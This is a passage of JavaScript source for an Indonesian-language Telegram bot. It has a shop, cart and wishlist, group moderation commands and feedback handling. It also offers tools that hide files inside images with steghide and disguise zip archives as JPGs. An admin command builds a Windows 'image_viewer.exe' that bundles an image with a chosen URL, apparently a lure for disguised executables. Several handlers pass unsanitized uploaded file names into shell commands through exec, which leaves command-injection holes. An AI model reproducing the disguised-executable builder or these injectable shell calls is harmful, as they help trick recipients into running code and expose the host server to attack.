        } catch (error) {
            failureCount++;
            if (error.response && error.response.statusCode === 403) {
                console.warn(`Gagal mengirim broadcast ke user ${user.chatId} karena bot diblokir.`);
            } else {
                console.error(`Gagal mengirim broadcast ke user ${user.chatId}:`, error);
            }
        }
    }

    bot.sendMessage(chatId, `Pesan broadcast selesai dikirim.\nBerhasil: ${successCount}\nGagal: ${failureCount}`);
  });
});

async function sendFileAfterPurchase(chatId, productId) {
  try {
    const product = await Product.findById(productId);
    if (!product) {
      return bot.sendMessage(chatId, "Produk tidak ditemukan.");
    }

    await bot.sendDocument(chatId, fs.createReadStream(product.filePath), {
      filename: product.name,
      contentType: product.mimeType,
    });
    bot.sendMessage(chatId, `File "${product.name}" berhasil dikirim.`);
  } catch (error) {
    console.error("Gagal mengirim file:", error);
    bot.sendMessage(chatId, "Gagal mengirim file.");
  }
}

async function handleBuyProduct(chatId, userId, productId) {
  try {
    const product = await Product.findById(productId);
    if (!product) {
      return bot.sendMessage(chatId, "Produk tidak ditemukan.");
    }

    const user = await User.findOne({ chatId });
    if (!user) {
      return bot.sendMessage(chatId, "Anda belum terdaftar.");
    }

    if (product.price === 0) {
      sendFileAfterPurchase(chatId, productId);
    } else {
      if (user.saldo < product.price) {
        return bot.sendMessage(chatId, "Saldo Anda tidak cukup.");
      }

      user.saldo -= product.price;
      const transaction = new Transaction({
        userId: chatId,
        type: "purchase",
        productId: productId,
        amount: product.price,
        date: moment().format()
      });
      await Promise.all([user.save(), transaction.save()]);
      bot.sendMessage(chatId, `Saldo Anda telah dikurangi sebesar Rp ${product.price}.`);

      sendFileAfterPurchase(chatId, productId);
    }
  } catch (error) {
    console.error("Gagal memproses pembelian:", error.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses pembelian.");
  }
}

async function showWishlist(chatId, userId) {
     try {
        const user = await User.findOne({ chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }

        let message = "Wishlist Anda:\n\n";
        if (!wishlists[chatId] || wishlists[chatId].length === 0) {
            message += "Wishlist kosong.";
        } else {
            for (const productId of wishlists[chatId]) {
                const product = await Product.findById(productId);
                if (product) {
                    message += `- ${product.name} - Rp ${product.price}\n`;
                }
            }
        }
        bot.sendMessage(chatId, message);
    } catch (error) {
        console.error("Gagal menampilkan wishlist:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menampilkan wishlist.");
    }
}

async function handleAddToWishlist(chatId, userId, productId) {
 try {
        const user = await User.findOne({ chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }

        wishlists[chatId] = wishlists[chatId] || [];
        if (!wishlists[chatId].includes(productId)) {
            wishlists[chatId].push(productId);
            saveData();
            bot.sendMessage(chatId, "Produk telah ditambahkan ke wishlist.");
        } else {
            bot.sendMessage(chatId, "Produk sudah ada di wishlist.");
        }
    } catch (error) {
        console.error("Gagal menambahkan ke wishlist:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menambahkan ke wishlist.");
    }
}

async function handleRemoveFromWishlist(chatId, userId, productId) {
  try {
         const user = await User.findOne({ chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }
        wishlists[chatId] = wishlists[chatId] || [];
        wishlists[chatId] = wishlists[chatId].filter(id => id !== productId);
        saveData();
        bot.sendMessage(chatId, "Produk telah dihapus dari wishlist.");
    } catch (error) {
        console.error("Gagal menghapus dari wishlist:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus dari wishlist.");
    }
}

async function showCart(chatId, userId) {
    try {
        const user = await User.findOne({ chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }

        let message = "Keranjang Belanja Anda:\n\n";
        if (!carts[chatId] || carts[chatId].length === 0) {
            message += "Keranjang kosong.";
        } else {
            let totalPrice = 0;
            for (const productId of carts[chatId]) {
                const product = await Product.findById(productId);
                if (product) {
                    message += `- ${product.name} - Rp ${product.price}\n`;
                    totalPrice += product.price;
                }
            }
            message += `\nTotal: Rp ${totalPrice}\n`;
            const buttons = [
                { text: "Checkout", callback_data: "checkout" }
            ];
            message += "Pilih opsi:"
            bot.sendMessage(chatId, message, {reply_markup: createInlineKeyboard(buttons)});
        }
    } catch (error) {
        console.error("Gagal menampilkan keranjang:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menampilkan keranjang.");
    }
}

async function handleAddToCart(chatId, userId, productId) {
  try {
      const user = await User.findOne({ chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }

        carts[chatId] = carts[chatId] || [];
        if (!carts[chatId].includes(productId)) {
            carts[chatId].push(productId);
            saveData();
            bot.sendMessage(chatId, "Produk telah ditambahkan ke keranjang.");
        } else {
            bot.sendMessage(chatId, "Produk sudah ada di keranjang.");
        }
    } catch (error) {
        console.error("Gagal menambahkan ke keranjang:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menambahkan ke keranjang.");
    }
}

async function handleRemoveFromCart(chatId, userId, productId) {
    try {
         const user = await User.findOne({ chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }
        carts[chatId] = carts[chatId] || [];
        carts[chatId] = carts[chatId].filter(id => id !== productId);
        saveData();
        bot.sendMessage(chatId, "Produk telah dihapus dari keranjang.");
    } catch (error) {
        console.error("Gagal menghapus dari keranjang:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus dari keranjang.");
    }
}

bot.onText(/\/warn (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, "Perintah ini hanya dapat digunakan di grup.");
  }

    const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) {
        return bot.sendMessage(chatId, "Anda bukan admin atau owner group.");
    }

  const target = match[1].trim();
  const targetUserId = target.replace(/[^0-9]/g, '');

  if (!targetUserId) {
    return bot.sendMessage(chatId, "Sertakan mention user yang valid.");
  }

  bot.sendMessage(chatId, `User ${target} telah diperingatkan.`);
});

bot.onText(/\/mute (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (msg.chat.type === 'private') {
        return bot.sendMessage(chatId, "Perintah ini hanya dapat digunakan di grup.");
    }

     const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) {
        return bot.sendMessage(chatId, "Anda bukan admin atau owner group.");
    }

    const target = match[1].trim();
    const targetUserId = target.replace(/[^0-9]/g, '');

    if (!targetUserId) {
        return bot.sendMessage(chatId, "Sertakan mention user yang valid.");
    }

    bot.restrictChatMember(chatId, targetUserId, {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false
    }).then(() => {
        bot.sendMessage(chatId, `User ${target} telah dibisukan.`);
    }).catch(err => {
        console.error("Failed to mute user:", err);
        bot.sendMessage(chatId, "Gagal membisukan user.");
    });
});

bot.onText(/\/kick (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (msg.chat.type === 'private') {
        return bot.sendMessage(chatId, "Perintah ini hanya dapat digunakan di grup.");
    }
    const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) {
        return bot.sendMessage(chatId, "Anda bukan admin atau owner group.");
    }

    const target = match[1].trim();
    const targetUserId = target.replace(/[^0-9]/g, '');

    if (!targetUserId) {
        return bot.sendMessage(chatId, "Sertakan mention user yang valid.");
    }

        bot.kickChatMember(chatId, targetUserId).then(() => {
            bot.sendMessage(chatId, `User ${target} telah dikeluarkan.`);
        }).catch(err => {
            console.error("Failed to kick user:", err);
            bot.sendMessage(chatId, "Gagal mengeluarkan user.");
        });
});

bot.onText(/\/ban (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (msg.chat.type === 'private') {
        return bot.sendMessage(chatId, "Perintah ini hanya dapat digunakan di grup.");
    }
     const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) {
        return bot.sendMessage(chatId, "Anda bukan admin atau owner group.");
    }

    const target = match[1].trim();
    const targetUserId = target.replace(/[^0-9]/g, '');

    if (!targetUserId) {
        return bot.sendMessage(chatId, "Sertakan mention user yang valid.");
    }

        bot.banChatMember(chatId, targetUserId).then(() => {
            bot.sendMessage(chatId, `User ${target} telah dibanned.`);
        }).catch(err => {
            console.error("Failed to ban user:", err);
            bot.sendMessage(chatId, "Gagal mem-ban user.");
        });
});

bot.onText(/\/announce (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;

    if (msg.chat.type === 'private') {
        return bot.sendMessage(chatId, "Perintah ini hanya dapat digunakan di grup.");
    }
     const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

    const announcementText = match[1].trim();
   // placeholder
  // You code in this For TDLib
        bot.sendMessage(chatId, `*Pengumuman:*\n\n${announcementText}`, {parse_mode: "Markdown"}).then(sentMessage => {
        bot.pinChatMessage(chatId, sentMessage.message_id).catch(err => {
            console.error("Failed to pin message:", err);
        });
    }).catch(err => {
        console.error("Gagal mengirim pengumuman:", err);
    });

});

bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    const state = userStates[chatId];

    // Cek apakah pengguna sedang dalam alur fitur premium
    if (!state || !state.action) return;

    const actionParts = state.action.split('_');
    if (actionParts[0] !== 'awaiting' || actionParts[1] !== 'cover') {
        return;
    }

    const tool = actionParts[2];
    const photoFileId = msg.photo[msg.photo.length - 1].file_id; // Ambil resolusi tertinggi

    userStates[chatId].coverFileId = photoFileId;

    switch (tool) {
        case 'steghide':
            userStates[chatId].action = 'awaiting_embed_file_steghide';
            bot.sendMessage(chatId, '✅ Gambar sampul diterima. Sekarang, kirimkan file yang ingin Anda sembunyikan di dalamnya (sebagai dokumen).');
            break;
        case 'exiftool':
            userStates[chatId].action = 'awaiting_metadata_exiftool';
            bot.sendMessage(chatId, '✅ Gambar diterima. Sekarang, kirimkan metadata yang ingin Anda tulis dalam format:\n`key1:value1, key2:value2`\n\nContoh:\n`Author:Jules, Comment:File Rahasia`');
            break;
        case 'zip':
            userStates[chatId].action = 'awaiting_file_zip';
            bot.sendMessage(chatId, '✅ Gambar sampul diterima. Sekarang, kirimkan file yang ingin Anda samarkan di dalam gambar ini (sebagai dokumen).');
            break;
        case 'qrcode':
            userStates[chatId].action = 'awaiting_link_qrcode';
            bot.sendMessage(chatId, '✅ Gambar diterima. Sekarang, kirimkan tautan atau teks yang ingin Anda jadikan QR code.');
            break;
        default:
            // Reset state jika ada yang tidak beres
            delete userStates[chatId];
            break;
    }
});

bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    const state = userStates[chatId];

    if (!state || !state.action) return;

    const actionParts = state.action.split('_');
    if (actionParts[0] !== 'awaiting' || actionParts[1] !== 'embed' || actionParts[2] !== 'file') {
        return;
    }

    const tool = actionParts[3];
    const docFileId = msg.document.file_id;

    if (tool === 'steghide') {
        try {
            await bot.sendMessage(chatId, "File diterima. Memproses gambar, mohon tunggu...");

            // 1. Dapatkan link download untuk kedua file
            const coverLink = await bot.getFileLink(state.coverFileId);
            const embedLink = await bot.getFileLink(docFileId);

            // 2. Tentukan path file sementara
            const tempDir = path.join(__dirname, 'temp', chatId.toString());
            if (!fs.existsSync(tempDir)) {
                fs.mkdirSync(tempDir, { recursive: true });
            }
            const coverPath = path.join(tempDir, 'cover.jpg');
            const embedPath = path.join(tempDir, msg.document.file_name);
            const outputPath = path.join(tempDir, 'output.jpg');

            // 3. Download kedua file
            await downloadFile(coverLink, coverPath);
            await downloadFile(embedLink, embedPath);

            if (!fs.existsSync(coverPath) || !fs.existsSync(embedPath)) {
                bot.sendMessage(chatId, "Gagal mengunduh file yang diperlukan. Silakan coba lagi.");
                fs.rmSync(tempDir, { recursive: true, force: true });
                delete userStates[chatId];
                return;
            }

            // 4. Periksa kapasitas embed
            const infoCommand = `steghide info "${coverPath}" -p ""`;
            exec(infoCommand, (infoError, infoStdout, infoStderr) => {
                if (infoError) {
                    console.error(`Steghide Info Error: ${infoStderr}`);
                    bot.sendMessage(chatId, "Gagal mendapatkan informasi dari gambar sampul.");
                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                    return;
                }

                const capacityMatch = infoStdout.match(/(\d+\.\d+)\sKB/);
                if (!capacityMatch) {
                    bot.sendMessage(chatId, "Tidak dapat menentukan kapasitas gambar sampul.");
                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                    return;
                }

                const capacityInKb = parseFloat(capacityMatch[1]);
                const embedFileSizeInKb = fs.statSync(embedPath).size / 1024;

                if (embedFileSizeInKb > capacityInKb) {
                    bot.sendMessage(chatId, `File yang akan disematkan terlalu besar untuk gambar sampul.\nKapasitas: ${capacityInKb.toFixed(2)} KB\nUkuran File: ${embedFileSizeInKb.toFixed(2)} KB`);
                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                    return;
                }

                // 5. Jalankan perintah steghide
                const command = `steghide embed -cf "${coverPath}" -ef "${embedPath}" -sf "${outputPath}" -p "" -f`;
                exec(command, async (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Steghide Error: ${stderr}`);
                        bot.sendMessage(chatId, `Terjadi kesalahan saat memproses gambar dengan Steghide. Pastikan gambar sampul adalah JPG/BMP.`);
                        // Cleanup
                        fs.rmSync(tempDir, { recursive: true, force: true });
                        delete userStates[chatId];
                        return;
                    }

                    // 6. Kirim file hasil
                    await bot.sendDocument(chatId, outputPath, {}, {
                        caption: "Berikut adalah gambar Anda yang telah diproses dengan Steghide."
                    });

                    // 7. Hapus file sementara dan reset state
                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                });
            });

        } catch (e) {
            console.error("Gagal dalam proses steghide:", e);
            bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
            delete userStates[chatId];
        }
    } else if (tool === 'zip') {
        try {
            await bot.sendMessage(chatId, "File diterima. Membuat arsip dan menyamarkannya, mohon tunggu...");

            const coverLink = await bot.getFileLink(state.coverFileId);
            const embedLink = await bot.getFileLink(docFileId);
            const embedFileName = msg.document.file_name;

            const tempDir = path.join(__dirname, 'temp', chatId.toString());
            if (!fs.existsSync(tempDir)) {
                fs.mkdirSync(tempDir, { recursive: true });
            }
            const coverPath = path.join(tempDir, 'cover.jpg');
            const embedPath = path.join(tempDir, embedFileName);
            const zipPath = path.join(tempDir, 'archive.zip');
            const outputPath = path.join(tempDir, `output_${embedFileName}.jpg`);

            await downloadFile(coverLink, coverPath);
            await downloadFile(embedLink, embedPath);

            // 1. Zip the embed file
            const zipCommand = `zip -j "${zipPath}" "${embedPath}"`;
            exec(zipCommand, (zipError, zipStdout, zipStderr) => {
                if (zipError) {
                    console.error(`Zip Error: ${zipStderr}`);
                    bot.sendMessage(chatId, 'Gagal membuat arsip zip.');
                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                    return;
                }

                // 2. Concatenate the image and the zip file
                const concatCommand = `cat "${coverPath}" "${zipPath}" > "${outputPath}"`;
                exec(concatCommand, async (catError, catStdout, catStderr) => {
                    if (catError) {
                        console.error(`Concat Error: ${catStderr}`);
                        bot.sendMessage(chatId, 'Gagal menyamarkan arsip sebagai gambar.');
                        fs.rmSync(tempDir, { recursive: true, force: true });
                        delete userStates[chatId];
                        return;
                    }

                    await bot.sendDocument(chatId, outputPath, {}, {
                        caption: "Berikut adalah arsip Anda yang disamarkan sebagai gambar. Rename menjadi .zip untuk mengekstrak."
                    });

                    fs.rmSync(tempDir, { recursive: true, force: true });
                    delete userStates[chatId];
                });
            });

        } catch (e) {
            console.error("Gagal dalam proses zip:", e);
            bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
            delete userStates[chatId];
        }
    }
});

bot.on("polling_error", (error) => {
  console.error(error);
});

console.log(`${config.botName} berjalan...`);


async function handleMenfess(chatId) {
  bot.sendMessage(chatId, "Kirimkan pesan confess dengan format:\n\n`pesan|from|chat_id`\n\nUntuk mendapatkan chat_id, gunakan perintah /id <username>", { parse_mode: "Markdown" });
  bot.once("message", async (msg) => {
    const [pesan, from, targetChatId] = msg.text.split("|");
    if (!pesan || !from || !targetChatId) {
      return bot.sendMessage(chatId, "Format salah. Coba lagi.");
    }
    try {
      const message = `*Menfess Baru*\n\nPesan: ${pesan.trim()}\nFrom: ${from.trim()}`;
      await bot.sendMessage(targetChatId.trim(), message, { parse_mode: "Markdown" });
      bot.sendMessage(chatId, "Menfess berhasil dikirim!");
    } catch (error) {
      console.error("Gagal mengirim menfess:", error);
      bot.sendMessage(chatId, "Gagal mengirim menfess. Pastikan ID obrolan valid dan bot memiliki akses ke sana.");
    }
  });
}

async function handleSaran(chatId) {
  bot.sendMessage(chatId, "Kirimkan saran Anda:");
  bot.once("message", async (msg) => {
    const saran = msg.text;
    bot.sendMessage(config.adminId, `Saran baru dari ${msg.from.first_name}:\n\n${saran}`);
    bot.sendMessage(chatId, "Saran Anda telah dikirim. Terima kasih!");
  });
}

async function handleLaporan(chatId) {
  bot.sendMessage(chatId, "Kirimkan laporan Anda:");
  bot.once("message", async (msg) => {
    const laporan = msg.text;
    bot.sendMessage(config.adminId, `Laporan baru dari ${msg.from.first_name}:\n\n${laporan}`);
    bot.sendMessage(chatId, "Laporan Anda telah dikirim. Terima kasih!");
  });
}

bot.onText(/\/id (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1].trim().replace('@', '');

    try {
        const chat = await bot.getChat(`@${username}`);
        bot.sendMessage(chatId, `ID untuk @${username} adalah: \`${chat.id}\``, { parse_mode: "Markdown" });
    } catch (error) {
        bot.sendMessage(chatId, `Tidak dapat menemukan pengguna @${username}.`);
    }
});

async function handleConfess(chatId) {
  bot.sendMessage(chatId, "Kirimkan pesan confess Anda:", { parse_mode: "Markdown" });
  bot.once("message", async (msg) => {
    const pesan = msg.text;
    try {
      const message = `||${pesan.trim()}||`;
      const sentMessage = await bot.sendMessage(config.channelId, message, { parse_mode: "Markdown" });
      const messageLink = `https://t.me/${config.channelId.replace('@','')}/${sentMessage.message_id}`;
      bot.sendMessage(chatId, `Confess berhasil dikirim! Lihat di sini: ${messageLink}`);
    } catch (error) {
      console.error("Gagal mengirim confess:", error);
      bot.sendMessage(chatId, "Gagal mengirim confess. Pastikan bot adalah admin di channel dan dapat mengirim pesan.");
    }
  });
}

// Feedback Command
bot.onText(/\/feedback/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, '📝 Silakan ketik dan kirimkan masukan Anda untuk bot ini. Admin akan meninjaunya sesegera mungkin.');

    bot.once('message', async (feedbackMsg) => {
        if (feedbackMsg.chat.id !== chatId || (feedbackMsg.text && feedbackMsg.text.startsWith('/'))) {
            return;
        }

        const feedbackText = feedbackMsg.text;
        const userId = feedbackMsg.from.id;
        const username = feedbackMsg.from.username ? `@${feedbackMsg.from.username}` : (feedbackMsg.from.first_name || 'Pengguna');

        try {
            const Feedback = require('./models/feedback'); // Moved require here
            const newFeedback = new Feedback({
                userId,
                username,
                feedbackText
            });

            await newFeedback.save();

            bot.sendMessage(chatId, '✅ **Terima kasih!**\n\nMasukan Anda telah kami terima dan akan sangat membantu kami untuk berkembang menjadi lebih baik lagi. ✨');

            const adminNotification = `
- - - - - - - - - - - - - -
📮 **FEEDBACK BARU** 📮
- - - - - - - - - - - - - -
👤 **Dari:**
   - **User:** ${username}
   - **ID:** \`${userId}\`

💬 **Pesan:**
${feedbackText}
- - - - - - - - - - - - - -
`;

            const keyboard = {
                inline_keyboard: [
                    [
                        {
                            text: '✍️ Balas Pesan Ini',
                            callback_data: `reply_feedback_${userId}`
                        }
                    ]
                ]
            };

            bot.sendMessage(config.adminId, adminNotification, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

        } catch (error) {
            console.error("Gagal menyimpan feedback:", error);
            bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat menyimpan masukan Anda. Silakan coba lagi nanti.');
        }
    });
});

const classifier = new natural.BayesClassifier();

// Train the classifier with some sample data
classifier.addDocument('hallo', 'greeting');
classifier.addDocument('hai', 'greeting');
classifier.addDocument('selamat pagi', 'greeting');
classifier.addDocument('hi', 'greeting');

classifier.addDocument('kamu siapa', 'about_bot');
classifier.addDocument('apa tujuanmu', 'about_bot');
classifier.addDocument('apa yang bisa kamu lakukan', 'about_bot');

classifier.addDocument('siapa yang membuatmu', 'about_creator');
classifier.addDocument('siapa creatormu', 'about_creator');
classifier.addDocument('siapa ownermu', 'about_creator');

classifier.train();

// Awan AI Assistant Command
bot.onText(/\/awan (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1].toLowerCase();

    const classification = classifier.classify(query);

    let response = '';

    if (classification === 'greeting') {
        response = 'Halo! Ada yang bisa saya bantu?';
    } else if (classification === 'about_bot') {
        response = 'Saya adalah asisten awan, sebuah AI yang dirancang untuk membantu Anda.';
    } else if (classification === 'about_creator') {
        response = `Saya dibuat oleh ${config.ownerName}. Anda bisa menghubunginya di @${config.ownerUsername}.`;
    } else {
        response = 'Maaf, saya belum mengerti pertanyaan itu. Saya masih dalam tahap belajar.';
    }

    bot.sendMessage(chatId, `🤖 **asisten awan Menjawab:**\n\n${response}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/create_executable/, async (msg) => {
    const chatId = msg.chat.id;

    if (!isAdmin(msg.from.id)) {
        return bot.sendMessage(chatId, "Anda tidak memiliki izin.");
    }

    bot.sendMessage(chatId, "Silakan kirim gambar yang ingin Anda gunakan.");

    bot.once("photo", async (photoMsg) => {
        const photoFileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;

        bot.sendMessage(chatId, "Gambar diterima. Sekarang, kirimkan URL yang ingin Anda buka.");

        bot.once("text", async (urlMsg) => {
            const url = urlMsg.text;
            bot.sendMessage(chatId, "URL diterima. Membuat executable, mohon tunggu...");

            const tempDir = path.join(__dirname, 'temp', chatId.toString());
            if (!fs.existsSync(tempDir)) {
                fs.mkdirSync(tempDir, { recursive: true });
            }
            const imagePath = path.join(tempDir, 'image.jpg');
            const outputPath = path.join(tempDir, 'image_viewer.exe');

            try {
                const imageLink = await bot.getFileLink(photoFileId);
                await downloadFile(imageLink, imagePath);

                if (!fs.existsSync(imagePath)) {
                    return bot.sendMessage(chatId, "Gagal mengunduh gambar.");
                }

                const pkgCommand = `pkg -t node16-win-x64 -o "${outputPath}" --options "no-warnings" image_viewer.js -- ${imagePath} ${url}`;
                exec(pkgCommand, async (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Pkg Error: ${stderr}`);
                        return bot.sendMessage(chatId, "Gagal membuat executable.");
                    }

                    await bot.sendDocument(chatId, outputPath, {}, {
                        caption: "Berikut adalah executable Anda."
                    });

                    fs.rmSync(tempDir, { recursive: true, force: true });
                });
            } catch (e) {
                console.error("Gagal membuat executable:", e);
                bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
            }
        });
    });
});

module.exports = bot;
